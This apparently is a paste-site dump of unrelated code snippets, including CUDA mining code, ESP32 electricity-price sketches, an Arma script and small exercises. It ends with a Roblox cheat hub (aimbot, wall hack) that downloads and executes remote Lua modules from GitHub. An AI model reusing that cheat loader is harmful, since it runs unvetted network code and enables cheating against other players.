        apply_sha256(tx34, strlen((const char*)tx34), hashed_tx34, 1);
        strcpy((char *)tx1234, (const char *)hashed_tx12);
        strcat((char *)tx1234, (const char *)hashed_tx34);
        apply_sha256(tx1234, strlen((const char*)tx34), top_hash, 1);

        // prev_block_hash + top_hash
        strcpy((char*)block_content, (const char*)prev_block_hash);
        strcat((char*)block_content, (const char*)top_hash);
        current_length = strlen((char*) block_content);

        cudaEvent_t start, stop;
        startTiming(&start, &stop);

        cudaMemcpy(d_block_hash, block_hash, SHA256_HASH_SIZE, cudaMemcpyHostToDevice);

        cudaMemcpy(d_block_content, block_content, BLOCK_SIZE, cudaMemcpyHostToDevice);
        cudaMemcpy(d_nonce, &nonce, sizeof(uint64_t), cudaMemcpyHostToDevice);

        const size_t block_size = 300;
        size_t blocks_no = 100000000 / block_size;

        if (100000000 % block_size)
                ++blocks_no;

        findNonce<<<blocks_no, block_size>>>(d_block_content, current_length, d_block_hash, d_nonce);

        cudaDeviceSynchronize();

        float seconds = stopTiming(&start, &stop);

        cudaMemcpy(block_hash, d_block_hash, SHA256_HASH_SIZE, cudaMemcpyDeviceToHost);
        cudaMemcpy(&nonce, d_nonce, sizeof(uint64_t), cudaMemcpyDeviceToHost);

        cudaFree(d_block_content);
        cudaFree(d_block_hash);
        cudaFree(d_nonce);

        //float seconds = stopTiming(&start, &stop);
        printResult(block_hash, nonce, seconds);

        return 0;"
FqGNu3bQ,Untitled,AlexandrP,Java,Friday 10th of May 2024 08:54:29 AM CDT,"     // Wait until the expiration dropdown is visible
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        WebElement expirationDropdown = wait.until(ExpectedConditions.visibilityOfElementLocated(By.className(""select2-selection__rendered"")));

        // Click to open the dropdown
        expirationDropdown.click();

        // Select option by visible text
        WebElement tenMinutesOption = driver.findElement(By.xpath(""//li[text()='10 Minutes']""));
        tenMinutesOption.click();"
zNu6QjP3,haircut.py,ssoni,Python,Friday 10th of May 2024 08:49:36 AM CDT,"import random

def main():
    price = 25
    inflation = 3
    ror = 8
    total=0
    FREQ = 12
    AGE = 17
    END_AGE = 65
    x=0

    for i in range(END_AGE - AGE):
        haircutCostPerYear = price*FREQ
        total = total + haircutCostPerYear
        total = total *(1+ror/100)
        price = price * (1+inflation/100)        
    print(f'Total saved is {total}')
    
    d=1
    while(total > 0):
        total = gamble(total)
        print(f'After {d} drunken casino night, Total saved is {total}')
        d += 1

def gamble(total):
    num = random.randint(1,2)
    if num==1:
        total = total * 2
    else:
        total = 0
    return total

main()
"
wNbJbhmT,O(N) approach to Path sum 3,jayati,C++,Friday 10th of May 2024 08:47:50 AM CDT,"class Solution {
public:
    int get(TreeNode *root, int t, map<long long, int> &mp, long long pr = 0) {
        if (root == nullptr) return 0;
        pr += root->val;
        int ans = mp[pr - t];
        mp[pr]++;

        // Recursively calculate the count of paths for left and right subtrees
        ans += get(root->left, t, mp, pr);
        ans += get(root->right, t, mp, pr);

        // Decrement the frequency of the current prefix sum (backtrack)
        mp[pr]--;
        return ans;
    }

    int pathSum(TreeNode* root, int targetSum) {
        map<long long, int> mp;
        mp[0] = 1;
        return get(root, targetSum, mp);
    }
};"
n67wxSxN,Untitled,_VooDoo_,JavaScript,Friday 10th of May 2024 08:25:30 AM CDT,"<script setup>
import {ref} from ""vue"";

const itemsmenu = [{
  link: 'main',
  color: 'danger',
  icon: 'ri-arrow-up-circle-fill',
},
  {
    link: 'about',
    color: 'info',
    icon: 'ri-arrow-up-circle-fill',
  },
  {
    link: 'contact',
    color: 'warning',
    icon: 'ri-arrow-up-circle-fill',
  },
]
</script>

<template>
  <ul>
    <li v-for=""item in itemsmenu"" :key=""item.id"">
      <a :class=""`${item.color}`"" :href=""`${item.link}`""> {{ item.link }}</a> <i :class=""`${item.icon}`""></i>
    </li>
  </ul>
  <p><i class=""arrow-right-wide-line""></i>asdasd</p>
  <i class=""arrow-right-wide-line""></i>
</template>

<style scoped>

</style>
"
knHsGNJs,fn_initSafezone.sqf,dapperstache,SQF,Friday 10th of May 2024 08:16:29 AM CDT,"//NUP\NUP_flagCapture\functions\NUP_fnc_initSafezone.sqf


if !(isServer) exitWith {};

// Check if sidesArray already exists and initialize if not
if (isNil ""sidesArray"") then {
    sidesArray = [East, West, Civilian, Independent];
};

// Ensure there are sides in the array before proceeding
if !(count sidesArray > 0) exitWith {};

params 
[
    [""_logic"", objNull, [objNull]],
    [""_markerSize"", [250, 140], [[]], 2]
];

// Randomly select a side
_side = sidesArray call BIS_fnc_selectRandom;
diag_log format [""_side: %1"", _side];

_flagSide = ""Flag_White_F"";
_szMarkerColor = ""ColorBlack"";
_spawnName = ""HQ"";

// Define flag color based on side
switch (_side) do 
{
    case east: 
    {
        _flagSide = ""Flag_Red_F"";
        _szMarkerColor = ""ColorOPFOR"";
		_spawnName = ""Opfor HQ"";
    };
    case west: 
    {
        _flagSide = ""Flag_Blue_F"";
        _szMarkerColor = ""ColorBLUFOR"";
		_spawnName = ""Blufor HQ"";
    };
    case civilian: 
    {
        _flagSide = ""Flag_FD_Purple_F"";
        _szMarkerColor = ""ColorCivilian"";
		_spawnName = ""Civilian HQ"";
    };
    case independent: 
    {
        _flagSide = ""Flag_Green_F"";
        _szMarkerColor = ""ColorIndependent"";
		_spawnName = ""Indepdendent HQ"";
    };
}; 

// Create safezone marker
_safezoneMarker = createMarker [format [""safezoneMarker_%1"", _side], getPosATL _logic];
_safezoneMarker setMarkerShape ""ELLIPSE"";
_safezoneMarker setMarkerSize _markerSize;
_safezoneMarker setMarkerDir 0;
_safezoneMarker setMarkerBrush ""Solid"";
_safezoneMarker setMarkerColor ""colorBlack""; 
_safezoneMarker setMarkerAlpha 0.85; 

// Create respawn marker
_respawnMarker = createMarker [format [""respawn_%1"", _side], getPosATL _logic];
_respawnMarker setMarkerType ""b_hq"";
_respawnMarker setMarkersize [1, 1];
_respawnMarker setMarkerAlpha 1; 
_respawnMarker setMarkerColor _szMarkerColor; 
_respawnMarker setMarkerText format [""%1"",_spawnName]; 

// Spawn flag
_flag = createVehicle[_flagSide, getPosATL _logic, [], 0, ""CAN_COLLIDE""];
_flag allowDamage false;
_flag setVariable[ ""NUP_respawnMarker"", _respawnMarker, true ];
_flag setVariable[ ""NUP_safezoneMarker"", _safezoneMarker, true ];

// Remove selected side from the array
sidesArray = sidesArray - [_side];

// Debugging
diag_log str allMapMarkers;
diag_log format [""_logic: %1"", _logic];

_baseEntry1 = objNull;
_baseEntry2 = objNull;
_baseExit1 = objNull;
_baseExit2 = objNull;


//Initialize Elevators
_syncedobjs = synchronizedObjects _logic;
{
    if (toLower str _x find ""base_exit_1_"" == 0) then
    {
        _baseExit1 = _x;
    }
} forEach _syncedobjs;

_syncedobjs = synchronizedObjects _logic;
{
    if (toLower str _x find ""base_exit_2"" == 0) then
    {
        _baseExit2 = _x;
    }
} forEach _syncedobjs;

_syncedobjs = synchronizedObjects _logic;
{
    if (toLower str _x find ""base_entry_1"" == 0) then
    {
        _baseEntry1 = _x;
    }
} forEach _syncedobjs;

_syncedobjs = synchronizedObjects _logic;
{
    if (toLower str _x find ""base_entry_2"" == 0) then
    {
        _baseEntry2 = _x;
    }
} forEach _syncedobjs;

// Log the names of the objects assigned to variables
diag_log format[""logic instance: %1"", _logic];
diag_log format[""_baseExit1: %1"", _baseExit1];
diag_log format[""_baseExit1 position: %1"", getPosATL _baseExit1];
diag_log format[""_baseExit2: %1"", _baseExit2];
diag_log format[""_baseExit2 position: %1"", getPosATL _baseExit2];
diag_log format[""_baseEntry1: %1"", _baseEntry1];
diag_log format[""_baseEntry1 position: %1"", getPosATL _baseEntry1];
diag_log format[""_baseEntry2: %1"", _baseEntry2];
diag_log format[""_baseEntry2 position: %1"", getPosATL _baseEntry2];

[
	params [""_baseExit1"", ""_baseEntry1""];
    _baseExit1, // Object the action is attached to
  	""Exit to Helipads"", // Title of the action
    ""\a3\ui_f\data\IGUI\Cfg\holdactions\holdAction_takeOff2_ca.paa"", // Icon Idle
    ""\a3\ui_f\data\IGUI\Cfg\holdactions\holdAction_takeOff2_ca.paa"", // Icon Progress
    ""_this distance player < 1"", // Condition for the action to be shown
    ""_this distance player < 1"", // Condition for the action to progress
    {}, // Code executed when action starts (leave blank)
    {}, // Code executed on every progress tick (leave blank)
    { 
        [0, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
        sleep 0.5;
        player setPosATL (getPosATL _baseEntry2);
        [1, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
    }, // Code executed on completion
    {}, // Code executed on interruption (leave blank)
    [], // Arguments passed to the scripts as _this select 3 (empty array)
    6, // Action duration in seconds
    0, // Priority
    false, // Remove on completion
    false // Show in unconscious state
] remoteExec [""BIS_fnc_holdActionAdd"", 0, _baseExit1]; // MP-compatible implementation

[
	params [""_baseExit2"", ""_baseEntry2""];
    _baseExit2, // Object the action is attached to
    ""Exit to Vehicle Lot"", // Title of the action
    ""\a3\Missions_F_Orange\Data\Img\Showcase_LawsOfWar\action_exit_CA.paa"", // Icon Idle
    ""\a3\Missions_F_Orange\Data\Img\Showcase_LawsOfWar\action_exit_CA.paa"", // Icon Progress
    ""_this distance player < 1"", // Condition for the action to be shown
    ""_this distance player < 1"", // Condition for the action to progress
    {}, // Code executed when action starts (leave blank)
    {}, // Code executed on every progress tick (leave blank)
    {
        [0, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
        sleep 0.5;
        
        player setPosATL (getPosATL _baseEntry2);
        [1, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
    }, // Code executed on completion
    {}, // Code executed on interruption (leave blank)
    [], // Arguments passed to the scripts as _this select 3 (empty array)
    6, // Action duration in seconds
    0, // Priority
    false, // Remove on completion
    false // Show in unconscious state
] remoteExec [""BIS_fnc_holdActionAdd"", 0, _baseExit2]; // MP-compatible implementation

[
	params [""_baseEntry1"", ""_baseExit1""];
    _baseEntry1, // Object the action is attached to
    """", // Title of the action
    ""\a3\ui_f\data\IGUI\Cfg\holdactions\holdAction_takeOff1_ca.paa"", // Icon Idle
    ""\a3\ui_f\data\IGUI\Cfg\holdactions\holdAction_takeOff1_ca.paa"", // Icon Progress
    ""_this distance player < 1"", // Condition for the action to be shown
    ""_this distance player < 1"", // Condition for the action to progress
    {}, // Code executed when action starts (leave blank)
    {}, // Code executed on every progress tick (leave blank)
    {
        [0, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
        sleep 0.5;
       
        // Set the player position to the new position
        player setPosATL (getPosATL _baseExit1);
        [1, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
    }, // Code executed on completion
    {}, // Code executed on interruption (leave blank)
    [], // Arguments passed to the scripts as _this select 3 (empty array)
    6, // Action duration in seconds
    0, // Priority
    false, // Remove on completion
    false // Show in unconscious state
] remoteExec [""BIS_fnc_holdActionAdd"", 0, _baseEntry1]; // MP-compatible implementation

[
	params [""_baseEntry2"", ""_baseExit2""];
    _baseEntry2, // Object the action is attached to
    ""Enter Base"", // Title of the action
    ""\a3\Missions_F_Orange\Data\Img\Showcase_LawsOfWar\action_exit_CA.paa"", // Icon Idle
    ""\a3\Missions_F_Orange\Data\Img\Showcase_LawsOfWar\action_exit_CA.paa"", // Icon Progress
    ""_this distance player < 1"", // Condition for the action to be shown
    ""_this distance player < 1"", // Condition for the action to progress
    {}, // Code executed when action starts (leave blank)
    {}, // Code executed on every progress tick (leave blank)
    {
        [0, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
        sleep 0.5;
        // Set the player position to the new position
        player setPosATL (getPosATL _baseEexit2);
        [1, ""BLACK"", 1, 1] spawn BIS_fnc_fadeEffect;
    }, // Code executed on completion
    {}, // Code executed on interruption (leave blank)
    [], // Arguments passed to the scripts as _this select 3 (empty array)
    6, // Action duration in seconds
    0, // Priority
    false, // Remove on completion
    false // Show in unconscious state
] remoteExec [""BIS_fnc_holdActionAdd"", 0, _baseEntry2]; // MP-compatible implementation

"
j5cPhBrp,startupexe.lua,Leon_Lejon,Lua,Friday 10th of May 2024 07:43:53 AM CDT,"shell.run(""os/Starter"")"
PfNGjYaH,Stroomverbruik API - ESP32-3248S035,jgoy,C++,Friday 10th of May 2024 07:41:37 AM CDT,"/* 
 Arduino IDE - board: ESP32 Dev Module of DOIT ESP32 DEVKIT V1
 sketch voor ESP32-3248S035 -  https://nl.aliexpress.com/item/1005006398547061.html
 De ESP moet de huidige tijd hebben, om de string te
 kunnen samenstellen om de juiste link aan te maken (voorbeeld):
 https://api.energy-charts.info/price?bzn=BE&start=2024-05-10%2000%3A00%3A00&end=2024-05-10%2000%3A00%3A00

 =====================================================================================
 In de JSON zit per paar 
 - UNIX-tijd (epochtijd: aantal seconden sinds 1/1/1970 middernacht), per uur oplopend
 - de prijs per MWh voor dat uur
 =====================================================================================

 De API geeft niet altijd evenveel elementen terug. Dit varieert per uur tussen 11 en 36 items.
 De code moet daar uiteraard op inspelen. Daarenboven is het leerrijk om te rekenen met tijd: 
 hoe stel je een datum bij door die met 1 dag op te hogen (de laatste dag van de maand moet ook
 de maand ophogen enz.)

 Een Watchdog timer (esp-idf) herstart de ESP elk uur. 
*/

#include <TimeLib.h>       // https://github.com/PaulStoffregen/Time
#include <TFT_eSPI.h>      // https://github.com/Bodmer/TFT_eSPI
#include <WiFiManager.h>   // https://github.com/tzapu/WiFiManager/
#include <ArduinoJson.h>   // https://github.com/bblanchon/ArduinoJson
#include <HTTPClient.h>    // for connection with API ""https://ipapi.co/json/""
#include <esp_task_wdt.h>  // voor de watchdog timer (onnodig om deze bibliotheek te installeren = core)

TFT_eSPI tft = TFT_eSPI();  // User_Setup.h instellen zoals je kan vinden op http://espgo.be bij ESP32-3248S035
WiFiManager myWiFi;

struct tm tInfo;  // https://cplusplus.com/reference/ctime/tm/
bool pasOpgestart = true;
const char* time_Zone = ""CET-1CEST,M3.5.0,M10.5.0/3"";  // https://github.com/nayarsystems/posix_tz_db/blob/master/zones.csv
char* verbind[] = { ""WiFi: geen verbinding"", ""Verbind met hotspot"", ""S035_ESP"", ""Start een browser op adres"",
                    ""192.168.4.1"", ""om netwerk en paswoord"", ""in te brengen"" };
double prijzen[34];
uint32_t epo[34];
uint32_t WDT_TIMEOUT = 3600;  // watchdog timer: elk uur
String mijnLink = ""https://api.energy-charts.info/price?bzn=BE&start="";  // wordt verderop aangevuld met de tijd
String nu = """";

void setup() {
  Serial.begin(115200);
  esp_task_wdt_init(WDT_TIMEOUT, true);         // watchdogtimer. true = ""panic mode"", dus de ESP32 herstart als de timer afloopt
  esp_task_wdt_add(NULL);                       // esp_task_wdt_add(handle). NULL = huidige thread aan de watchdog toevoegen
  pinMode(16, OUTPUT), digitalWrite(16, HIGH);  // groen uit
  pinMode(17, OUTPUT), digitalWrite(17, HIGH);  // blauw uit
  tft.init(), tft.setRotation(2);               // USB bovenaan
  tft.fillScreen(TFT_BLACK);
  showLogoWiFi(TFT_GREEN);
  myWiFi.setAPCallback(toonBerichtGeenVerbinding);  // indien geen WiFi gevonden wordt
  myWiFi.autoConnect(""S035_ESP"");
  configTzTime(time_Zone, ""be.pool.ntp.org"");
  tft.fillScreen(TFT_BLACK);
}

void loop() {
  verwerkTijd();
  if (!digitalRead(0)) deepSleep();
}

void showLogoWiFi(uint32_t myColor) {  // 3 lijnen code = sneller dan grafisch bestand laden
  tft.fillCircle(160, 240, 6, myColor);
  for (byte i = 0; i < 4; i++) tft.drawSmoothArc(160, 240, 37 - i * 7, 35 - i * 7, 135, 225, myColor, myColor, true);
}

void verwerkTijd() {
  char theDate[11];
  char omgekeerdDatum[11];
  char mijnTijd[3];
  getLocalTime(&tInfo);  // SNTP synchronisatie bij opstart en daarna elke 3 uur op een ESP32
  tft.drawRect(-1, 26, 322, 2, WiFi.isConnected() ? TFT_GREEN : TFT_RED);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextFont(4);
  tft.setCursor(0, 0);
  tft.printf(""%02d:%02d:%02d"", tInfo.tm_hour, tInfo.tm_min, tInfo.tm_sec);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(tft.getCursorX() + 90, 0);
  strftime(theDate, sizeof(theDate), ""%d-%m-%G"", &tInfo);  // https://cplusplus.com/reference/ctime/strftime/
  tft.print(theDate);
  if (pasOpgestart) {  // bij opstart energiedata opvragen en verwerken
    pasOpgestart = false;
    tft.fillScreen(TFT_BLACK);
    delay(2000);
    strftime(omgekeerdDatum, sizeof(omgekeerdDatum), ""%G-%m-%d"", &tInfo);
    nu = omgekeerdDatum;
    nu += ""%20"";
    strftime(mijnTijd, sizeof(mijnTijd), ""%H"", &tInfo);
    nu += mijnTijd;
    nu += ""%3A00%3A00"";
    mijnLink += nu;
    mijnLink += ""&end="";
    time_t now;
    time(&now);
    now += 86400;  // 1 dag bijtellen (nieuwe tijd ""now"") om de einddatum te berekenen
    sprintf(omgekeerdDatum, ""%4d-%02d-%02d"", year(now), month(now), day(now));
    nu = omgekeerdDatum;
    nu += ""%20"";
    strftime(mijnTijd, sizeof(mijnTijd), ""%H"", &tInfo);
    nu += mijnTijd;
    nu += ""%3A00%3A00"";
    mijnLink += nu;
    toonData();
  }
}

String tweeCijfers(uint8_t input) {  // zet een byte om in een 2-cijferige string met vooroplopende 0.
  String res = ""00"" + String(input);
  res = res.substring(res.length() - 2, res.length());  // laatste 2 karakters overhouden
  return res;
}

void toonData() {
  Serial.println(mijnLink);
  if (mijnLink.length() > 51) {
    get_JsonData();
    tft.setTextColor(TFT_WHITE);
    tft.drawRect(-1, 47, 322, 2, WiFi.isConnected() ? TFT_GREEN : TFT_RED);
    tft.drawCentreString(""api.energy-charts.info (tijden = UTC)"", 160, 29, 2);
    tft.setCursor(0, 49, 2);
    tft.setTextFont(2);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    for (uint8_t i = 0; i < 34; i++) {
      if (epo[i] != 0) {  // er worden niet altijd evenveel waarden geretourneerd door de API
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.print(""   "");
        tft.print(tweeCijfers(i + 1));
        tft.print("". "");
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.printf(""%02d-%02d-%02d %02d:%02d"", day(epo[i]), month(epo[i]), year(epo[i]), hour(epo[i]), minute(epo[i]));
        tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
        tft.print("" --> "");
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.print(prijzen[i]);
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.println("" Eur/MWh"");
      }
    }
  }
}

void get_JsonData() {
  HTTPClient http;
  http.begin(mijnLink);
  if (http.GET() == 200) {
    DynamicJsonDocument doc(4096);
    auto error = deserializeJson(doc, http.getString());
    if (error) {
      Serial.print(F(""deserializeJson() failed with code ""));
      Serial.println(error.c_str());
    }
    for (uint8_t i = 0; i < 34; i++) {
      prijzen[i] = doc[""price""][i];
      epo[i] = doc[""unix_seconds""][i];
    }
  } else Serial.println(""Error in API response"");
  http.end();
}

void toonBerichtGeenVerbinding(WiFiManager* myWiFi) {
  tft.fillScreen(TFT_NAVY);
  tft.setTextColor(TFT_YELLOW), tft.setTextFont(4);
  for (uint8_t i = 0; i < 7; i++) tft.drawCentreString(verbind[i], 160, 50 + i * 40, 4);
}

void deepSleep() {
  esp_wifi_stop();
  esp_sleep_enable_ext1_wakeup(GPIO_SEL_0, ESP_EXT1_WAKEUP_ALL_LOW);
  delay(1500);  // UI debouncing
  esp_deep_sleep_start();
}"
808hr0E1,Stroomprijzen API,jgoy,C++,Friday 10th of May 2024 07:35:24 AM CDT,"/* 
 Arduino IDE - board: ESP32 Dev Module of DOIT ESP32 DEVKIT V1
 De ESP moet de huidige tijd hebben, om de string te
 kunnen samenstellen om de juiste link aan te maken (voorbeeld):
 https://api.energy-charts.info/price?bzn=BE&start=2024-05-10%2000%3A00%3A00&end=2024-05-10%2000%3A00%3A00

 =====================================================================================
 In de JSON die geretourneerd wordt zit per paar 
 - UNIX-tijd (epochtijd: aantal seconden sinds 1/1/1970 middernacht), per uur oplopend
 - de prijs per MWh voor dat uur
 =====================================================================================

 De API geeft niet altijd evenveel elementen terug. Dit varieert per uur tussen 36 en 11 items. 
 De code moet daar uiteraard op inspelen. Daarenboven is het leerrijk om te rekenen met tijd: 
 hoe stel je een datum bij door die met 1 dag op te hogen (de laatste dag van de maand moet ook
 de maand ophogen enz.)

 Een Watchdog timer (esp-idf) herstart de ESP elk uur. 

 De eerste keer dat je deze code opstart bij een (nog) niet gekende WiFi: 
 houd de Serial monitor in het oog. 
*/

#include <TimeLib.h>       // https://github.com/PaulStoffregen/Time
#include <WiFiManager.h>   // https://github.com/tzapu/WiFiManager/
#include <ArduinoJson.h>   // https://github.com/bblanchon/ArduinoJson
#include <HTTPClient.h>    // for connection with API ""https://ipapi.co/json/""
#include <esp_task_wdt.h>  // voor de watchdog timer (onnodig om deze bibliotheek te installeren = core)

WiFiManager myWiFi;

struct tm tInfo;  // https://cplusplus.com/reference/ctime/tm/
bool pasOpgestart = true;
const char* time_Zone = ""CET-1CEST,M3.5.0,M10.5.0/3"";  // https://github.com/nayarsystems/posix_tz_db/blob/master/zones.csv
char* verbind[] = { ""WiFi: geen verbinding"", ""Verbind met hotspot"", ""Stroom_ESP"", ""Start een browser op adres"",
                    ""192.168.4.1"", ""om netwerk en paswoord"", ""in te brengen"" };
double prijzen[34];
uint32_t epo[34];                                                        // voor de resp. epochtijden
uint32_t WDT_TIMEOUT = 3600;                                             // watchdog timer: elk uur
String mijnLink = ""https://api.energy-charts.info/price?bzn=BE&start="";  // wordt verderop aangevuld met de tijden
String nu = """";

void setup() {
  Serial.begin(115200);
  esp_task_wdt_init(WDT_TIMEOUT, true);             // watchdogtimer. true = ""panic mode"", dus de ESP32 herstart als de timer afloopt
  esp_task_wdt_add(NULL);                           // esp_task_wdt_add(handle). NULL = huidige thread aan de watchdog toevoegen
  myWiFi.setAPCallback(toonBerichtGeenVerbinding);  // indien geen WiFi gevonden wordt
  myWiFi.autoConnect(""Stroom_ESP"");
  configTzTime(time_Zone, ""be.pool.ntp.org"");
}

void loop() {
  verwerkTijd();
  if (!digitalRead(0)) ESP.restart();  // knop ""flash""
}

void verwerkTijd() {
  char theDate[11];
  char omgekeerdDatum[11];
  char mijnTijd[3];
  getLocalTime(&tInfo);  // SNTP synchronisatie bij opstart en daarna elke 3 uur (op een ESP32)
  if (pasOpgestart) {    // bij opstart 1 keer energiedata opvragen en verwerken
    pasOpgestart = false;
    delay(2000);
    strftime(omgekeerdDatum, sizeof(omgekeerdDatum), ""%G-%m-%d"", &tInfo);
    nu = omgekeerdDatum;
    nu += ""%20"";
    strftime(mijnTijd, sizeof(mijnTijd), ""%H"", &tInfo);
    nu += mijnTijd;
    nu += ""%3A00%3A00"";
    mijnLink += nu;
    mijnLink += ""&end="";
    time_t now;
    time(&now);
    now += 86400;  // 1 dag bijtellen (nieuwe tijd ""now"") om de einddatum te berekenen
    sprintf(omgekeerdDatum, ""%4d-%02d-%02d"", year(now), month(now), day(now));
    nu = omgekeerdDatum;
    nu += ""%20"";
    strftime(mijnTijd, sizeof(mijnTijd), ""%H"", &tInfo);
    nu += mijnTijd;
    nu += ""%3A00%3A00"";
    mijnLink += nu;
    toonData();
  }
}

void toonData() {
  Serial.println(mijnLink);
  if (mijnLink.length() > 51) {
    get_JsonData();
    for (uint8_t i = 0; i < 80; i++) Serial.print(""="");
    Serial.println();
    Serial.println(""Stroomprijzen (tijden = UTC)"");
    for (uint8_t i = 0; i < 80; i++) Serial.print(""="");
    Serial.println();
    for (uint8_t i = 0; i < 34; i++) {
      if (epo[i] != 0) {  // lege waarden niet weergeven
        Serial.print(tweeCijfers(i + 1));
        Serial.print("". "");
        Serial.printf(""%02d-%02d-%02d %02d:%02d"", day(epo[i]), month(epo[i]), year(epo[i]), hour(epo[i]), minute(epo[i]));
        Serial.print("" --> "");
        Serial.print(prijzen[i]);
        Serial.println(""\tEur/MWh"");
      }
    }
    for (uint8_t i = 0; i < 80; i++) Serial.print(""="");
    Serial.println();
  }
}

String tweeCijfers(uint8_t input) {  // zet een byte om in een 2-cijferige string met vooroplopende 0.
  String res = ""00"" + String(input);
  res = res.substring(res.length() - 2, res.length());  // laatste 2 karakters overhouden
  return res;
}

void get_JsonData() {
  HTTPClient http;
  http.begin(mijnLink);
  if (http.GET() == 200) {
    DynamicJsonDocument doc(4096);
    auto error = deserializeJson(doc, http.getString());
    if (error) {
      Serial.print(F(""deserializeJson() failed with code ""));
      Serial.println(error.c_str());
    }
    for (uint8_t i = 0; i < 34; i++) {
      prijzen[i] = doc[""price""][i];
      epo[i] = doc[""unix_seconds""][i];
    }
  } else Serial.println(""Error in API response"");
  http.end();
}

void toonBerichtGeenVerbinding(WiFiManager* myWiFi) {
  for (uint8_t i = 0; i < 7; i++) Serial.println(verbind[i]);
}"
nnHaGtcn,Aim air hub,Maks14a,Lua,Friday 10th of May 2024 07:16:56 AM CDT,"--[[

	AirHub by Exunys © CC0 1.0 Universal (2023)

	https://github.com/Exunys

]]

--// Cache

local loadstring, getgenv, setclipboard, tablefind, UserInputService = loadstring, getgenv, setclipboard, table.find, game:GetService(""UserInputService"")

--// Loaded check

if AirHub or AirHubV2Loaded then
    return
end

--// Environment

getgenv().AirHub = {}

--// Load Modules

loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/AirHub/main/Modules/Aimbot.lua""))()
loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/AirHub/main/Modules/Wall%20Hack.lua""))()

--// Variables

local Library = loadstring(game:GetObjects(""rbxassetid://7657867786"")[1].Source)() -- Pepsi's UI Library
local Aimbot, WallHack = getgenv().AirHub.Aimbot, getgenv().AirHub.WallHack
local Parts, Fonts, TracersType = {""Head"", ""HumanoidRootPart"", ""Torso"", ""Left Arm"", ""Right Arm"", ""Left Leg"", ""Right Leg"", ""LeftHand"", ""RightHand"", ""LeftLowerArm"", ""RightLowerArm"", ""LeftUpperArm"", ""RightUpperArm"", ""LeftFoot"", ""LeftLowerLeg"", ""UpperTorso"", ""LeftUpperLeg"", ""RightFoot"", ""RightLowerLeg"", ""LowerTorso"", ""RightUpperLeg""}, {""UI"", ""System"", ""Plex"", ""Monospace""}, {""Bottom"", ""Center"", ""Mouse""}

--// Frame

Library.UnloadCallback = function()
	Aimbot.Functions:Exit()
	WallHack.Functions:Exit()
	getgenv().AirHub = nil
end

local MainFrame = Library:CreateWindow({
	Name = ""AirHub"",
	Themeable = {
		Image = ""7059346386"",
		Info = """",
		Credit = false
	},
	Background = """",
	Theme = [[{""__Designer.Colors.topGradient"":""000000"",""__Designer.Settings.ShowHideKey"":""Enum.KeyCode.RightShift"",""__Designer.Colors.section"":""FFFFFF"",""__Designer.Colors.hoveredOptionBottom"":""000000"",""__Designer.Background.ImageAssetID"":""rbxassetid://4427304036"",""__Designer.Colors.selectedOption"":""000000"",""__Designer.Colors.unselectedOption"":""000000"",""__Designer.Files.WorkspaceFile"":""AirHub"",""__Designer.Colors.unhoveredOptionTop"":""000000"",""__Designer.Colors.outerBorder"":""FFFFFF"",""__Designer.Background.ImageColor"":""FFFFFF"",""__Designer.Colors.tabText"":""FFFFFF"",""__Designer.Colors.elementBorder"":""FFFFFF"",""__Designer.Colors.sectionBackground"":""000000"",""__Designer.Colors.innerBorder"":""FFFFFF"",""__Designer.Background.ImageTransparency"":100,""__Designer.Colors.bottomGradient"":""000000"",""__Designer.Colors.elementText"":""FFFFFF"",""__Designer.Colors.hoveredOptionTop"":""000000"",""__Designer.Colors.otherElementText"":""FFFFFF"",""__Designer.Colors.main"":""FFFFFF"",""__Designer.Colors.background"":""000000"",""__Designer.Colors.unhoveredOptionBottom"":""000000"",""__Designer.Background.UseBackgroundImage"":true}]]
})

--// Tabs

local AimbotTab = MainFrame:CreateTab({
	Name = ""Aimbot""
})

local VisualsTab = MainFrame:CreateTab({
	Name = ""Visuals""
})

local CrosshairTab = MainFrame:CreateTab({
	Name = ""Crosshair""
})

local FunctionsTab = MainFrame:CreateTab({
	Name = ""Functions""
})

--// Aimbot Sections

local Values = AimbotTab:CreateSection({
	Name = ""Values""
})

local Checks = AimbotTab:CreateSection({
	Name = ""Checks""
})

local ThirdPerson = AimbotTab:CreateSection({
	Name = ""Third Person""
})

local FOV_Values = AimbotTab:CreateSection({
	Name = ""Field Of View"",
	Side = ""Right""
})

local FOV_Appearance = AimbotTab:CreateSection({
	Name = ""FOV Circle Appearance"",
	Side = ""Right""
})

--// Visuals Sections

local WallHackChecks = VisualsTab:CreateSection({
	Name = ""Checks""
})

local ESPSettings = VisualsTab:CreateSection({
	Name = ""ESP Settings""
})

local BoxesSettings = VisualsTab:CreateSection({
	Name = ""Boxes Settings""
})

local ChamsSettings = VisualsTab:CreateSection({
	Name = ""Chams Settings""
})

local TracersSettings = VisualsTab:CreateSection({
	Name = ""Tracers Settings"",
	Side = ""Right""
})

local HeadDotsSettings = VisualsTab:CreateSection({
	Name = ""Head Dots Settings"",
	Side = ""Right""
})

local HealthBarSettings = VisualsTab:CreateSection({
	Name = ""Health Bar Settings"",
	Side = ""Right""
})

--// Crosshair Sections

local CrosshairSettings = CrosshairTab:CreateSection({
	Name = ""Settings""
})

local CrosshairSettings_CenterDot = CrosshairTab:CreateSection({
	Name = ""Center Dot Settings"",
	Side = ""Right""
})

--// Functions Sections

local FunctionsSection = FunctionsTab:CreateSection({
	Name = ""Functions""
})

--// Aimbot Values

Values:AddToggle({
	Name = ""Enabled"",
	Value = Aimbot.Settings.Enabled,
	Callback = function(New, Old)
		Aimbot.Settings.Enabled = New
	end
}).Default = Aimbot.Settings.Enabled

